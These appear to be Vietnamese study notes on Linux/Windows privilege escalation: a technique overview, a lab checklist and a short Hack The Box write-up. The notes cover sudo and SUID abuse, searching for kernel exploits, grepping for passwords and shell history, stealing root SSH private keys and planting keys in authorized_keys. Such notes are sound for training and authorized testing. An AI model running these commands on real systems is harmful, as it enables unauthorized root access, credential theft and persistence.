# Privilege Escalation

## Ý chính

Sau khi có initial access vào target, ta thường chỉ có quyền thấp, ví dụ:

```bash
www-data
apache
nginx
```

Muốn kiểm soát hoàn toàn hệ thống, cần leo thang đặc quyền lên:

```text
Linux   → root
Windows → Administrator / SYSTEM
```

Privilege escalation bắt đầu bằng **local enumeration**.

---

## Các hướng PrivEsc phổ biến

### 1. PrivEsc Checklists

Dùng checklist để kiểm tra hệ thống có điểm yếu nào không.

Nguồn hay dùng:
- HackTricks
- PayloadsAllTheThings
- GTFOBins
- LOLBAS

---

### 2. Enumeration Scripts

Linux:
- LinPEAS
- LinEnum
- linuxprivchecker

Windows:
- Seatbelt
- JAWS
- winPEAS

PEASS là bộ script phổ biến, có cả Linux và Windows.

Chạy LinPEAS:

```bash
./linpeas.sh
```

Lưu ý:
- Script tự động chạy rất nhiều command
- Có thể tạo nhiều noise
- Có thể bị antivirus/EDR/SIEM phát hiện
- Trong môi trường thật cần xin phép và cân nhắc enumerate thủ công

---

### 3. Kernel Exploits

Nếu OS/kernel quá cũ, có thể tồn tại kernel exploit.

Kiểm tra kernel Linux:

```bash
uname -a
cat /etc/os-release
```

Tìm exploit:

```bash
searchsploit linux kernel <version>
```

Ví dụ:
- CVE-2016-5195
- DirtyCow

Cảnh báo:
- Kernel exploit có thể làm crash hệ thống
- Chỉ chạy trong lab hoặc khi có approval rõ ràng

---

### 4. Vulnerable Software

Kiểm tra phần mềm cài trên máy.

Linux:

```bash
dpkg -l
rpm -qa
```

Windows:

```text
C:\Program Files
C:\Program Files (x86)
```

Sau đó tìm exploit theo tên phần mềm + version:

```bash
searchsploit <software> <version>
```

---

### 5. User Privileges

Kiểm tra user hiện tại có quyền gì.

Linux:

```bash
id
whoami
sudo -l
```

Nếu `sudo -l` cho phép chạy command với quyền root, có thể tìm cách leo quyền qua GTFOBins.

Ví dụ full sudo:

```bash
sudo su -
```

Ví dụ NOPASSWD:

```bash
sudo -l
(user : user) NOPASSWD: /bin/echo
```

Chạy command dưới user khác:

```bash
sudo -u user /bin/echo Hello World!
```

Các hướng cần kiểm tra:
- sudo privilege
- SUID binary
- writable file/script
- group permission
- Windows token privileges

---

### 6. Scheduled Tasks / Cron Jobs

Linux dùng cron job, Windows dùng scheduled task.

Các file cron cần kiểm tra:

```bash
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```

Nếu ta có quyền ghi vào script được cron chạy bởi root, có thể chèn reverse shell hoặc command để leo quyền.

---

### 7. Exposed Credentials

Tìm password trong:
- Config files
- Log files
- Backup files
- `.bash_history`
- PowerShell PSReadLine history
- Web app source code

Ví dụ:

```text
/var/www/html/config.php:
$conn = new mysqli(localhost, 'db_user', 'password123');
```

Có thể dùng password để:
- Đăng nhập database
- Thử `su` sang user khác
- SSH vào server
- Kiểm tra password reuse

Ví dụ:

```bash
su -
```

---

### 8. SSH Keys

Nếu đọc được private key:

```bash
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
```

Copy về máy attacker, set permission:

```bash
chmod 600 id_rsa
```

SSH bằng key:

```bash
ssh root@10.10.10.10 -i id_rsa
```

Nếu có quyền ghi vào `.ssh/authorized_keys`, có thể thêm public key của mình.

Tạo key:

```bash
ssh-keygen -f key
```

Thêm public key vào target:

```bash
echo "ssh-rsa AAAA... user@attacker" >> /home/user/.ssh/authorized_keys
```

SSH vào target:

```bash
ssh user@TARGET_IP -i key
```

---

## Tư duy PrivEsc

```text
Initial Access
→ Local Enumeration
→ Check user privileges
→ Check OS/kernel/software
→ Check cron/scheduled tasks
→ Check exposed credentials
→ Check SSH keys
→ Exploit safely
→ Confirm privilege
```

Command xác nhận quyền:

```bash
whoami
id
hostname
```

---
# Checklist: Privilege Escalation Lab

## A. Xác định user hiện tại

```bash
whoami
id
hostname
pwd
```

- [ ] User hiện tại là ai?
- [ ] Thuộc group nào?
- [ ] Có phải root/admin chưa?
- [ ] Shell đang ở thư mục nào?

---

## B. Thu thập thông tin OS/kernel

```bash
uname -a
cat /etc/os-release
hostnamectl
```

- [ ] OS là gì?
- [ ] Version bao nhiêu?
- [ ] Kernel version bao nhiêu?
- [ ] Có quá cũ không?
- [ ] Có kernel exploit công khai không?

Tìm exploit:

```bash
searchsploit linux kernel <version>
```

---

## C. Chạy enum script nếu được phép

```bash
./linpeas.sh
```

Hoặc:

```bash
./linenum.sh
```

- [ ] Đọc kỹ phần màu đỏ/vàng
- [ ] Kiểm tra SUID
- [ ] Kiểm tra sudo
- [ ] Kiểm tra cron jobs
- [ ] Kiểm tra writable files
- [ ] Kiểm tra credential leak
- [ ] Không chạy bừa trên production nếu chưa được phép

---

## D. Kiểm tra sudo privilege

```bash
sudo -l
```

Nếu thấy:

```text
(ALL : ALL) ALL
```

thử:

```bash
sudo su -
```

Nếu thấy NOPASSWD:

```text
NOPASSWD: /path/to/binary
```

tra GTFOBins:

```text
https://gtfobins.github.io/
```

- [ ] Binary nào được chạy với sudo?
- [ ] Có cần password không?
- [ ] Có thể spawn shell không?
- [ ] Có thể read/write file không?

---

## E. Kiểm tra SUID binary

```bash
find / -perm -4000 -type f 2>/dev/null
```

- [ ] Có binary lạ không?
- [ ] Có binary thuộc GTFOBins không?
- [ ] Có binary custom không?
- [ ] Có thể abuse để spawn shell/read file không?

---

## F. Kiểm tra phần mềm cài đặt

Linux Debian/Ubuntu:

```bash
dpkg -l
```

Linux RedHat/CentOS:

```bash
rpm -qa
```

- [ ] Có software/version cũ không?
- [ ] Có service nội bộ không?
- [ ] Có public exploit không?

Tìm exploit:

```bash
searchsploit <software> <version>
```

---

## G. Kiểm tra cron job/scheduled task

```bash
cat /etc/crontab
ls -la /etc/cron.d
ls -la /var/spool/cron/crontabs 2>/dev/null
```

- [ ] Có cron job chạy bởi root không?
- [ ] Script được cron gọi có writable không?
- [ ] Directory chứa script có writable không?
- [ ] Có thể chèn command/reverse shell không?

---

## H. Tìm credential bị lộ

Tìm trong web config:

```bash
grep -Ri "password\|passwd\|pwd\|user\|db_" /var/www 2>/dev/null
```

Tìm trong home:

```bash
grep -Ri "password\|passwd\|pwd" /home 2>/dev/null
```

Kiểm tra history:

```bash
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

- [ ] Có database password không?
- [ ] Có SSH credential không?
- [ ] Có API key/token không?
- [ ] Có password reuse không?

Thử chuyển user:

```bash
su - <user>
```

---

## I. Kiểm tra SSH keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

Nếu đọc được private key:

```bash
chmod 600 id_rsa
ssh user@TARGET_IP -i id_rsa
```

Nếu ghi được `authorized_keys`:

```bash
ssh-keygen -f key
cat key.pub
```

Thêm public key vào target:

```bash
echo "ssh-rsa AAAA..." >> /home/user/.ssh/authorized_keys
```

SSH bằng private key:

```bash
ssh user@TARGET_IP -i key
```

---

## J. Xác nhận leo quyền thành công

```bash
whoami
id
hostname
```

- [ ] Nếu Linux: đã là `root` chưa?
- [ ] Nếu Windows: đã là `Administrator` hoặc `SYSTEM` chưa?
- [ ] Có đọc được flag/root.txt không?

---
# Write-up 
```bash
# user1 -> user2
sudo -u user2 -g user2 /bin/bash

# lấy user2 flag
cat /home/user2/flag.txt

# user2 tìm root private key
find / -name id_rsa -type f 2>/dev/null

# copy key root
cp /root/.ssh/id_rsa /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa

# SSH root bằng custom port của HTB
ssh -i /tmp/root_id_rsa root@154.57.164.64 -p <PORT_HTB_CUNG_CAP>

# lấy root flag
cat /root/flag.txt
```
